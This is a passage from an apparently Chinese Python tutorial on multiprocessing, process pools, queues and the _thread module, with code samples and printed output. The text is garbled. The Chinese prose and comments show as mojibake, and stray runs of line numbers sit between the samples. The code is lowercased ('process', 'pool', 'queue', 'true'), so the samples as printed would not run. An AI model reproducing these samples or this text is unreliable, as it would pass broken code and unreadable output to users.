23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\njoinçç¨æ³ï¼joinè¡¨ç¤ºçç­å¾ä¸ä¸ªè¿ç¨ç»æè¿è¡ãå¦æå¨ä¸»è¿ç¨ä¸­è°ç¨äºæä¸ªè¿ç¨joinæ¹æ³ï¼åä¼ç­å­è¿ç¨æ§è¡å®æä¹åæä¼ç»§ç»­æ§è¡ä¸»è¿ç¨ã\n\nfrom multiprocessing import process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = process(target = worker, args = (3,))\n    p.start()\n    #ç­å¾è¿ç¨pç»æ­¢\n    p.join()\n    print(\"ä¸»è¿ç¨ç»æ!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njoinä¸­çåæ°å¯ä»¥æ·»å ä¸ä¸ªè¶æ¶æ¶é´ï¼å¦æè¶è¿è¿ä¸ªæ¶é´å°±ä¸ç»§ç»­ç­å¾äºã\n\nfrom multiprocessing import process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = process(target = worker, args = (5,))\n    p.start()\n    #ç­å¾è¿ç¨pç»æ­¢\n    p.join(3)\n    print(\"ä¸»è¿ç¨ç»æ!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nprocesså¯¹è±¡çå®ä¾å±æ§å¦ä¸è¡¨æç¤ºï¼\n\nå±æ§     æè¿°\nname   è¿ç¨çåç§°\npid    è¿ç¨çæ´æ°è¿ç¨id\n\nç¤ºä¾ä»£ç ï¼\n\n#å¯¼å¥æ¨¡å\nimport multiprocessing\nimport time\n#å®ä¹è¿ç¨æ§è¡å½æ°\ndef clock(interval):\n    for i in range(5):\n        print('å½åæ¶é´ä¸º{0}ï¼'.format(time.ctime()))\n        time.sleep(interval)\nif __name__=='__main__':\n    #åå»ºè¿ç¨\n    p=multiprocessing.process(target=clock,args=(1,))\n    #å¯å¨è¿ç¨\n    p.start()\n    p.join()\n    #è·åè¿ç¨çid\n    print('p.id:',p.pid)\n    #è·åè¿ç¨çåç§°\n    print('p.name:',p.name)\n    #å¤æ­è¿ç¨æ¯å¦è¿è¡\n    print('p.is_alive:',p.is_alive())\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nåå»ºå¤ä¸ªå½æ°è¿ç¨ï¼\n\n#å¯¼å¥æ¨¡å\nimport multiprocessing\nimport time\n#åå»ºè¿ç¨è°ç¨å½æ°\ndef work1(interval):\n    print('work1')\n    time.sleep(interval)\n    print('end work1')\ndef work2(interval):\n    print('work2')\n    time.sleep(interval)\n    print('end work2')\ndef work3(interval):\n    print('work3')\n    time.sleep(interval)\n    print('end work3')\nif __name__=='__main__':\n    #åå»ºè¿ç¨å¯¹è±¡\n    p1=multiprocessing.process(target=work1,args=(4,))\n    p2=multiprocessing.process(target=work2,args=(3,))\n    p3=multiprocessing.process(target=work3,args=(2,))\n    #å¯å¨è¿ç¨\n    p1.start()\n    p2.start()\n    p3.start()\n    p1.join()\n    p2.join()\n    p3.join()\n    print('ä¸»è¿ç¨ç»æ')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# ç»§æ¿processæ¹å¼åå»ºè¿ç¨\n\nåå»ºè¿ç¨çæ¹å¼è¿å¯ä»¥ä½¿ç¨ç±»çæ¹å¼ï¼å¯ä»¥èªå®ä¹ä¸ä¸ªç±»ï¼ç»§æ¿processç±»ï¼æ¯æ¬¡å®ä¾åè¿ä¸ªç±»çæ¶åï¼å°±ç­åäºå®ä¾åä¸ä¸ªè¿ç¨å¯¹è±¡ã\n\n#å¯¼å¥æ¨¡å\nfrom multiprocessing import process\nimport time\n#å®ä¹çº¿ç¨ç±»\nclass clockprocess(process):\n    def __init__(self,interval):\n        process.__init__(self)\n        self.interval=interval\n    def run(self):\n        print('å­è¿ç¨å¼å§æ§è¡çæ¶é´:{}'.format(time.ctime()))\n        time.sleep(self.interval)\n        print('å­è¿ç¨ç»æçæ¶é´:{}'.format(time.ctime()))\n\nif __name__=='__main__':\n    #åå»ºè¿ç¨\n    p=clockprocess(2)\n    #å¯å¨è¿ç¨\n    p.start()\n    p.join()\n    print('ä¸»è¿ç¨ç»æ')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# è¿ç¨æ± \n\nå¨å©ç¨pythonè¿è¡ç³»ç»ç®¡ççæ¶åï¼ç¹å«æ¯åæ¶æä½å¤ä¸ªæä»¶ç®å½ï¼æèè¿ç¨æ§å¶å¤å°ä¸»æºï¼å¹¶è¡æä½å¯ä»¥èçº¦å¤§éçæ¶é´ãå½è¢«æä½å¯¹è±¡æ°ç®ä¸å¤§æ¶ï¼å¯ä»¥ç´æ¥å©ç¨multiprocessingä¸­çprocesså¨ææçå¤ä¸ªè¿ç¨ï¼åå ä¸ªè¿å¥½ï¼ä½å¦ææ¯ä¸ç¾ä¸ªï¼ä¸åä¸ªç®æ ï¼æå¨çå»éå¶è¿ç¨æ°éå´åå¤ªè¿ç¹çï¼æ­¤æ¶å¯ä»¥åæ¥è¿ç¨æ± çåæã\n\npoolå¯ä»¥æä¾æå®æ°éçè¿ç¨ï¼ä¾ç¨æ·è°ç¨ï¼å½ææ°çè¯·æ±æäº¤å°poolä¸­æ¶ï¼å¦ææ± è¿æ²¡ææ»¡ï¼é£ä¹å°±ä¼åå»ºä¸ä¸ªæ°çè¿ç¨ç¨æ¥æ§è¡è¯¥è¯·æ±ï¼ä½å¦ææ± ä¸­çè¿ç¨æ°å·²ç»è¾¾å°è§å®æå¤§å¼ï¼é£ä¹è¯¥è¯·æ±å°±ä¼ç­å¾ï¼ç´å°æ± ä¸­æè¿ç¨ç»æï¼æä¼åå»ºæ°çè¿ç¨ãpoolçè¯­æ³æ ¼å¼å¦ä¸ï¼\n\npoolï¼[numprocess [, initializer [, initargs]]]ï¼\n# numprocess è¿ç¨ä¸ªæ° å¦æå¦æçç¥ åä½¿ç¨cpu_count()çå¼\n# initializeræ¯ä¸ªå·¥ä½è¿ç¨å¯å¨æ¶è¦è°ç¨çå¯¹è±¡\n# initargs è°ç¨è¿ç¨æ¶çåæ°\n\n\n1\n2\n3\n4\n\n\npoolç±»æå¦ä¸çå®ä¾æ¹æ³ï¼\n\næ¹æ³                                                    æè¿°\napplyï¼func [,args [,kwargs]]ï¼                         å¨ä¸ä¸ªæ± å·¥ä½è¿ç¨ä¸­æ§è¡å½æ°ï¼*argsï¼**kwargsï¼ï¼ç¶åè¿åç»æã\napply_asyncï¼func [, args [,kwargs [,callback ] ] ]ï¼   å¨ä¸ä¸ªæ± å·¥ä½è¿ç¨ä¸­å¼æ­¥å°æ§è¡å½æ°ï¼*argsï¼**kwargsï¼ï¼ç¶åè¿åç»æãæ­¤æ¹æ³çç»ææ¯asyncresultç±»çå®ä¾ï¼ç¨åå¯ç¨äºè·å¾æç»ç»æãcallbackæ¯å¯è°ç¨å¯¹è±¡ï¼æ¥åè¾å¥åæ°ãå½funcçç»æåä¸ºå¯ç¨æ¶ï¼å°ç«å³ä¼ éç»callbackãcallbackç¦æ­¢æ§è¡ä»»ä½é»å¡æä½ï¼å¦åå°é»å¡æ¥æ¶å¶ä»å¼æ­¥æä½ä¸­çç»æ\nclose()                                               å³é­è¿ç¨æ± ï¼é²æ­¢è¿è¡è¿ä¸æ­¥æä½ãå¦æè¿ææèµ·çæä½ï¼å®ä»¬å°å¨å·¥ä½è¿ç¨ç»æ­¢ä¹åå®æ\njoin()                                                ç­å¾ææå·¥ä½è¿ç¨éåºãæ­¤æ¹æ³åªè½å¨closeï¼ï¼æèterminateï¼ï¼æ¹æ³ä¹åè°ç¨\nimap( funcï¼iterable [ ,chunksize] )                   mapï¼ï¼å½æ°ççæ¬ä¹ä¸ï¼è¿åè¿­ä»£å¨èéç»æåè¡¨\nimap_unordered( funcï¼iterable [ï¼chunksize] )          åimapï¼ï¼å½æ°ä¸æ ·ï¼åªæ¯ç»æçé¡ºåºæ ¹æ®ä»å·¥ä½è¿ç¨æ¥æ¶å°çæ¶é´ä»»æç¡®å®\nmap( funcï¼iterable [ï¼chunksize] )                     å°å¯è°ç¨å¯¹è±¡funcåºç¨ç»iterableä¸­çææé¡¹ï¼ç¶åä»¥åè¡¨çå½¢å¼è¿åç»æãéè¿å°iterableååä¸ºå¤åå¹¶å°å·¥ä½åæ´¾ç»å·¥ä½è¿ç¨ï¼å¯ä»¥å¹¶è¡å°æ§è¡è¿é¡¹æä½ãchunksizeæå®æ¯åä¸­çé¡¹æ°ãå¦ææ°éè¾å¤§ï¼å¯ä»¥å¢å¤§chunksizeçå¼æ¥æåæ§è½\nmap_async( funcï¼iterable [ï¼chunksize [ï¼callback]] )   åmapï¼ï¼å½æ°ï¼ä½ç»æçè¿åæ¯å¼æ­¥çãè¿åå¼æ¯asyncresultç±»çå®ä¾ï¼ç¨åå¯ç¨ä¸è·åç»æãcallbackæ¯ææ¥åä¸ä¸ªåæ°çå¯è°å¯¹è±¡ãå¦ææä¾callableï¼å½ç»æåä¸ºå¯ç¨æ¶ï¼å°ä½¿ç¨ç»æè°ç¨callable\nterminate()                                           ç«å³ç»æ­¢ææå·¥ä½è¿ç¨ï¼åæ¶ä¸æ§è¡ä»»ä½æ¸çæç»æä»»ä½æèµ·å·¥ä½ãå¦æpè¢«åå¾åæ¶ï¼å°èªå¨è°ç¨æ­¤å½æ°\nget( [ timeout] )                                     è¿åç»æï¼å¦ææå¿è¦åç­å¾ç»æå°è¾¾ãtimeoutæ¯å¯éçè¶æ¶ãå¦æç»æå¨æå®æ¶é´åæ²¡æå°è¾¾ï¼å°å¼åmultiprocessing.timeouterrorå¼å¸¸ãå¦æè¿ç¨æä½ä¸­å¼åäºå¼å¸¸ï¼å®å°å¨è°ç¨æ­¤æ¹æ³æ¶åæ¬¡è¢«å¼å\nready()                                               å¦æè°ç¨å®æï¼åè¿åtrue\nsucessful()                                           å¦æè°ç¨å®æä¸æ²¡æå¼åå¼å¸¸ï¼è¿åtrueãå¦æå¨ç»æå°±ç»ªä¹åè°ç¨æ­¤æ¹æ³ï¼å°å¼åassertionerrorå¼å¸¸\nwait( [timeout] )                                     ç­å¾ç»æåä¸ºå¯ç¨ãtimeoutæ¯å¯éçè¶æ¶\n\nåå»ºéé»å¡çè¿ç¨æ± ï¼\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"endï¼\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #ç»´ææ§è¡çè¿ç¨æ»æ°ä¸ºprocessesï¼å½ä¸ä¸ªè¿ç¨æ§è¡å®æ¯åä¼æ·»å æ°çè¿ç¨è¿å»\n        pool.apply_async(func, (msg, ))\n\n    pool.close()#è¿ç¨æ± å³é­ä¹åä¸åæ¥æ¶æ°çè¯·æ±\n    #è°ç¨joinä¹åï¼åè°ç¨closeå½æ°ï¼å¦åä¼åºéã\n    # æ§è¡å®closeåä¸ä¼ææ°çè¿ç¨å å¥å°pool,joinå½æ°ç­å¾ææå­è¿ç¨ç»æ\n    pool.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\né»å¡çè¿ç¨æ± ï¼\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #ç»´ææ§è¡çè¿ç¨æ»æ°ä¸ºprocessesï¼å½ä¸ä¸ªè¿ç¨æ§è¡å®æ¯åä¼æ·»å æ°çè¿ç¨è¿å»\n        pool.apply(func, (msg, ))\n\n    pool.close()\n    #è°ç¨joinä¹åï¼åè°ç¨closeå½æ°ï¼å¦åä¼åºéã\n    # æ§è¡å®closeåä¸ä¼ææ°çè¿ç¨å å¥å°pool,joinå½æ°ç­å¾ææå­è¿ç¨ç»æ\n    # pool.join()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# è¿ç¨é´çéä¿¡\n\nå¨å±åéå¨å¤ä¸ªè¿ç¨ä¸­ä¸å±äº«ï¼è¿ç¨ä¹é´çæ°æ®æ¯ç¬ç«çï¼é»è®¤æåµä¸äºä¸å½±åã\n\nå¤ä¸ªè¿ç¨ä¸­çæ°æ®ä¸å±äº«ï¼\n\nfrom multiprocessing import process\nnum=1\ndef work1():\n    global num\n    num+=5\n    print('å­è¿ç¨1è¿è¡ï¼num:',num)\n\ndef work2():\n    global num\n    num += 10\n    print('å­è¿ç¨2è¿è¡ï¼numï¼',num)\n\nif __name__=='__main__':\n    print('ç¶è¿ç¨å¼å§è¿è¡')\n    p1=process(target=work1)\n    p2=process(target=work2)\n    p1.start()\n    p2.start()\n    p1.join()\n    p2.join()\n\"\"\"\nç¶è¿ç¨å¼å§è¿è¡\nå­è¿ç¨1è¿è¡ï¼num: 6\nå­è¿ç¨2è¿è¡ï¼numï¼ 11\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nqueueæ¯å¤è¿ç¨å®å¨çéåï¼å¯ä»¥ä½¿ç¨queueå®ç°å¤è¿ç¨ä¹é´çæ°æ®ä¼ éãputæ¹æ³ç¨ä»¥æå¥æ°æ®å°éåä¸­ï¼putæ¹æ³è¿æä¸¤ä¸ªå¯éåæ°ï¼blockedåtimeoutãå¦æblockedä¸ºtrueï¼é»è®¤å¼ï¼ï¼å¹¶ä¸timeoutä¸ºæ­£å¼ï¼è¯¥æ¹æ³ä¼é»å¡timeoutæå®çæ¶é´ï¼ç´å°è¯¥éåæå©ä½çç©ºé´ãå¦æè¶æ¶ï¼ä¼æåºqueue.fullå¼å¸¸ãå¦æblockedä¸ºfalseï¼ä½è¯¥queueå·²æ»¡ï¼ä¼ç«å³æåºqueue.fullå¼å¸¸ã\n\ngetæ¹æ³å¯ä»¥ä»éåè¯»åå¹¶ä¸å é¤ä¸ä¸ªåç´ ãåæ ·ï¼getæ¹æ³æä¸¤ä¸ªå¯éåæ°ï¼blockedåtimeoutãå¦æblockedä¸ºtrueï¼é»è®¤å¼ï¼ï¼å¹¶ä¸timeoutä¸ºæ­£å¼ï¼é£ä¹å¨ç­å¾æ¶é´åæ²¡æåå°ä»»ä½åç´ ï¼ä¼æåºqueue.emptyå¼å¸¸ãå¦æblockedä¸ºfalseï¼æä¸¤ç§æåµå­å¨ï¼å¦æqueueæä¸ä¸ªå¼å¯ç¨ï¼åç«å³è¿åè¯¥å¼ï¼å¦åï¼å¦æéåä¸ºç©ºï¼åç«å³æåºqueue.emptyå¼å¸¸ã\n\nqueueçå®ä¾æ¹æ³ï¼\n\næ¹æ³                                 æè¿°\ncancle_join_thread()               ä¸ä¼å¨è¿ç¨éåºæ¶èªå¨è¿æ¥åå°çº¿ç¨ãè¿å¯ä»¥é²æ­¢join_thread()æ¹æ³é»å¡\nclose()                            å³é­éåï¼é²æ­¢éåä¸­å å¥æ´å¤æ°æ®ãè°ç¨æ­¤æ¹æ³æ¶ï¼åå°çº¿ç¨å°ç»§ç»­åå¥é£äºå·²å¥éåå°æªåå¥æ°æ®ï¼ä½å°å¨æ­¤æ¹æ³å®ææ¶é©¬ä¸å³é­\nempty()                            å¦æè°ç¨æ­¤æ¹æ³æ¶qä¸ºç©ºï¼è¿åtrue\nfull()                             å¦æqå·²æ»¡ï¼è¿åtrue\nget([block [,timeout])             è¿åqä¸­çä¸ä¸ªé¡¹ãå¦æqä¸ºç©ºï¼æ­¤æ¹æ³å°é»å¡ï¼ç´å°éåä¸­æé¡¹å¯ç¨ä¸ºæ­¢ãblockç¨äºæ§å¶é»å¡è¡ä¸ºï¼é»è®¤ä¸ºtrueãå¦æè®¾ç½®ä¸ºfalseï¼å°å¼åqueue.emptyå¼å¸¸(å®ä¹å¨queueæ¨¡åä¸­)ãtimeoutæ¯å¯éè¶æ¶æ¶é´ï¼ç¨å¨é»å¡æ¨¡å¼ä¸­ãå¦æå¨æå®çæ¶é´é´éåæ²¡æé¡¹åä¸ºå¯ç¨ï¼å°å¼åqueue.emptyå¼å¸¸\njoin_thread()                      è¿æ¥éåçåå°çº¿ç¨ãæ­¤æ¹æ³ç¨äºå¨è°ç¨q.close()æ¹æ³ä¹åï¼ç­å¾ææéåé¡¹è¢«æ¶èãé»è®¤æåµä¸æ­¤æ¹æ³ç±ä¸æ¯qçåå§åå»ºèçææè¿ç¨è°ç¨ãè°ç¨q.cancle_join_thread()æ¹æ³å¯ä»¥ç¦æ­¢è¿ç§è¡ä¸º\nput(item [ , block [, timeout]])   å°itemæ¾å¥éåãå¦æéåå·²æ»¡ï¼æ­¤æ¹æ³å°é»å¡è³æç©ºé´å¯ç¨ä¸ºæ­¢ãblockæ§å¶é»å¡è¡ä¸ºï¼é»è®¤ä¸ºtrueãå¦æè®¾ç½®ä¸ºfalseï¼å°å¼åqueue.emptyå¼å¸¸(å®ä¹å¨queueæ¨¡åä¸­)ãtimeoutæå®å¨é»å¡æ¨¡å¼ä¸­ç­å¾å¯ç¨æ¶ç©ºé´çæ¶é´é¿ç­ãè¶æ¶åå°å¼åqueue.fullå¼å¸¸ã\nqsize()                            è¿åç®åéåä¸­é¡¹çæ­£ç¡®æ°éã\njoinablequeue([maxsize])           åå»ºå¯è¿æ¥çå±äº«è¿ç¨éåãè¿å°±åæ¯ä¸ä¸ªqueueå¯¹è±¡ï¼ä½éååè®¸é¡¹çæ¶è´¹èéç¥çäº§èé¡¹å·²ç»è¢«æåå¤çãéç¥è¿ç¨æ¯ä½¿ç¨å±äº«çä¿¡å·åæ¡ä»¶åéæ¥å®ç°ç\ntask_done()                        æ¶è´¹èä½¿ç¨æ­¤æ¹æ³ååºä¿¡å·ï¼è¡¨ç¤ºq.get()è¿åçé¡¹å·²ç»è¢«å¤çãå¦æè°ç¨æ­¤æ¹æ³çæ¬¡æ°å¤§äºä»éåä¸­å é¤çé¡¹çæ°éï¼å°å¼åvalueerrorå¼å¸¸\njoin()                             çäº§èä½¿ç¨æ­¤æ¹æ³è¿è¡é»å¡ï¼ç¥ééåä¸­çææé¡¹åè¢«å¤çãé»å¡å°æç»­å°ä½éåä¸­çæ¯ä¸ªé¡¹åè°ç¨q.task_done()æ¹æ³ä¸ºæ­¢\n\nä½¿ç¨æ¹æ³ï¼\n\nfrom multiprocessing import queue\nq=queue(3)\nq.put('æ¶æ¯1')\nq.put('æ¶æ¯2')\nprint('æ¶æ¯éåæ¯å¦å·²æ»¡ï¼',q.full())\nq.put('æ¶æ¯3')\nprint('æ¶æ¯éåæ¯å¦å·²æ»¡ï¼',q.full())\n\n# q.put('æ¶æ¯4')å ä¸ºæ¶æ¯éåå·²æ»¡ï¼éè¦ç´æ¥åå¥éè¦ç­å¾ï¼å¦æè¶æ¶ä¼æåºå¼å¸¸ï¼\n# æä»¥åå¥æ¶åéå¤æ­ï¼æ¶æ¯éåæ¯å¦å·²æ»¡\nif not q.full():\n    q.put('æ¶æ¯4')\n\n#åçè¯»åæ¶æ¯æ¶ï¼åå¤æ­æ¶æ¯éåæ¯å¦ä¸ºç©ºï¼åè¯»å\nif not q.empty():\n    for i in range(q.qsize()):\n        print(q.get())\n        \n\"\"\"\næ¶æ¯éåæ¯å¦å·²æ»¡ï¼ false\næ¶æ¯éåæ¯å¦å·²æ»¡ï¼ true\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå®ç°è¿ç¨é´çéä¿¡æ¹æ³ï¼\n\nfrom multiprocessing import *\nimport time\ndef write(q):\n    #å°åè¡¨ä¸­çåç´ åå¥éåä¸­\n    for i in [\"a\",\"b\",\"c\"]:\n        print('å¼å§åå¥å¼%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#è¯»å\ndef read(q):\n    print('å¼å§è¯»å')\n    while true:\n        if not q.empty():\n            print('è¯»åå°:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #åå»ºéå\n    q=queue()\n    #åå»ºåå¥è¿ç¨\n    pw=process(target=write,args=(q,))\n    pr=process(target=read,args=(q,))\n    #å¯å¨è¿ç¨\n    pw.start()\n    pw.join()\n    pr.start()\n    pr.join()\n    \n\"\"\"\nå¼å§åå¥å¼a\nå¼å§åå¥å¼b\nå¼å§åå¥å¼c\nå¼å§è¯»å\nè¯»åå°: a\nè¯»åå°: b\nè¯»åå°: c\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nå¦æä½¿ç¨poolåå»ºè¿ç¨ï¼å°±éè¦ä½¿ç¨multiprocessing.manager()ä¸­çqueue()æ¥å®æè¿ç¨é´çéä¿¡ï¼èä¸æ¯multiprocessing.queue()ï¼å¦åä¼æåºå¦ä¸å¼å¸¸ã\n\nruntimeerror: queue objects should only be shared between processes through inheritance\n\nåå»ºè¿ç¨æ± ï¼å®æè¿ç¨é´çéä¿¡ï¼\n\nfrom multiprocessing import manager,pool\nimport time\ndef write(q):\n    #å°åè¡¨ä¸­çåç´ åå¥éåä¸­\n    for i in [\"a\",\"b\",\"c\"]:\n        print('å¼å§åå¥å¼%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#è¯»å\ndef read(q):\n    print('å¼å§è¯»å')\n    while true:\n        if not q.empty():\n            print('è¯»åå°:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #åå»ºéå\n    q=manager().queue()\n    #åå»ºè¿ç¨æ± \n    p=pool(3)\n    #ä½¿ç¨é»å¡æ¨¡å¼åå»ºè¿ç¨\n    p.apply(write,(q,))\n    p.apply(read,(q,))\n    p.close()\n    p.join()\n\n\"\"\"\nå¼å§åå¥å¼a\nå¼å§åå¥å¼b\nå¼å§åå¥å¼c\nå¼å§è¯»å\nè¯»åå°: a\nè¯»åå°: b\nè¯»åå°: c\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# çº¿ç¨\n\nçº¿ç¨ä¹æ¯å®ç°å¤ä»»å¡çä¸ç§æ¹å¼ï¼ä¸ä¸ªè¿ç¨ä¸­ï¼ä¹ç»å¸¸éè¦åæ¶åå¤ä»¶äºï¼å°±éè¦åæ¶è¿è¡å¤ä¸ªå­ä»»å¡ï¼è¿äºå­ä»»å¡å°±æ¯çº¿ç¨ãä¸ä¸ªè¿ç¨å¯ä»¥æ¥æå¤ä¸ªå¹¶è¡ççº¿ç¨ï¼å¶ä¸­æ¯ä¸ä¸ªçº¿ç¨ï¼å±äº«å½åè¿ç¨çèµæºã\n\nåºå«     è¿ç¨                                çº¿ç¨\næ ¹æ¬åºå«   ä½ä¸ºèµæºåéçåä½                         è°åº¦åæ§è¡çåä½\nå¼é     æ¯ä¸ä¸ªè¿ç¨é½æç¬ç«çä»£ç åæ°æ®ç©ºé´ï¼è¿ç¨é´çåæ¢ä¼æè¾å¤§çå¼é   çº¿ç¨å¯ä»¥çåºæ¯è½»éçº§çè¿ç¨ï¼å¤ä¸ªçº¿ç¨å±äº«åå­ï¼çº¿ç¨åæ¢çå¼éå°\næå¤ç¯å¢   å¨æä½ç³»ç»ä¸­ï¼åæ¶è¿è¡çå¤ä¸ªä»»å¡                  å¨ç¨åºä¸­å¤ä¸ªé¡ºåºæµåæ¶æ§è¡\nåéåå­   ç³»ç»å¨è¿è¡çæ¶åä¸ºæ¯ä¸ä¸ªè¿ç¨åéä¸åçåå­åºå           çº¿ç¨æä½¿ç¨çèµæºæ¯ä»æå±è¿ç¨çèµæº\nåå«å³ç³»   ä¸ä¸ªè¿ç¨åå¯ä»¥æ¥æå¤ä¸ªçº¿ç¨                     çº¿ç¨æ¯è¿ç¨çä¸é¨åï¼ææçº¿ç¨ææ¶åç§°ä¸ºæ¯è½»éçº§çè¿ç¨\n\nè¿ç¨åçº¿ç¨å¨ä½¿ç¨ä¸åæä¼ç¼ºç¹ï¼çº¿ç¨æ§è¡å¼éå°ï¼ä½ä¸å©äºèµæºçç®¡çåä¿æ¤ï¼èè¿ç¨æ­£ç¸åã\n\nå¨pythonç¨åºä¸­ï¼å¯ä»¥éè¿â_threadâåthreadingï¼æ¨èä½¿ç¨ï¼è¿ä¸¤ä¸ªæ¨¡åæ¥å¤ççº¿ç¨ãå¨python3ä¸­ï¼threadæ¨¡åå·²ç»åºå¼ãå¯ä»¥ä½¿ç¨threadingæ¨¡åä»£æ¿ãæä»¥ï¼å¨python3ä¸­ä¸è½åä½¿ç¨threadæ¨¡åï¼ä½æ¯ä¸ºäºå¼å®¹python3ä»¥åçç¨åºï¼å¨python3ä¸­å°threadæ¨¡åéå½åä¸ºâ_threadâã\n\n\n# _threadæ¨¡å\n\nå¨pythonç¨åºä¸­ï¼å¯ä»¥éè¿ä¸¤ç§æ¹å¼æ¥ä½¿ç¨çº¿ç¨ï¼ä½¿ç¨å½æ°æèä½¿ç¨ç±»æ¥åè£çº¿ç¨å¯¹è±¡ãå½ä½¿ç¨threadæ¨¡åæ¥å¤ççº¿ç¨æ¶ï¼å¯ä»¥è°ç¨éé¢çå½æ°start_new_thread()æ¥çæä¸ä¸ªæ°ççº¿ç¨ï¼è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n_thread.start_new_thread ( function, args[, kwargs] )\n# functionæ¯çº¿ç¨å½æ°\n# argsè¡¨ç¤ºä¼ éç»çº¿ç¨å½æ°çåæ°\n# kwargs æ¯å¯éåæ°\n\n\n1\n2\n3\n4\n\n\nåå»ºçº¿ç¨ç¤ºä¾ä»£ç ï¼\n\nimport _thread\nimport time\ndef fun1():\n    print('å¼å§è¿è¡fun1')\n    time.sleep(4)\n    print('è¿è¡fun1ç»æ')\ndef fun2():\n    print('å¼å§è¿è¡fun2')\n    time.sleep(2)\n    print('è¿è¡fun2ç»æ')\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun1\n    _thread.start_new_thread(fun1,())\n     #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun2\n    _thread.start_new_thread(fun2,())\n    time.sleep(6)\n\"\"\"\nå¼å§è¿è¡\nå¼å§è¿è¡fun1\nå¼å§è¿è¡fun2\nè¿è¡fun2ç»æ\nè¿è¡fun1ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nä»ç¨åºè¿è¡ç»æå¯ä»¥çåºï¼å¨fun2å½æ°ä¸­è°ç¨äºsleepå½æ°ä¼ç ï¼å½ä¼ç æé´ï¼ä¼éæ¾cpuçè®¡ç®èµæºï¼è¿æ¶fun1æ¢å äºcpuèµæºå¼å§æ§è¡ã\n\nå¸¦åæ°ççº¿ç¨ç¤ºä¾ä»£ç ï¼\n\nimport _thread\nimport time\ndef fun1(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(thread_name))\n    time.sleep(2)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(thread_name))\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun1\n    _thread.start_new_thread(fun1,('thread-1',4))\n     #å¯å¨ä¸ä¸ªçº¿ç¨è¿è¡å½æ°fun2\n    _thread.start_new_thread(fun2,('thread-2',2))\n    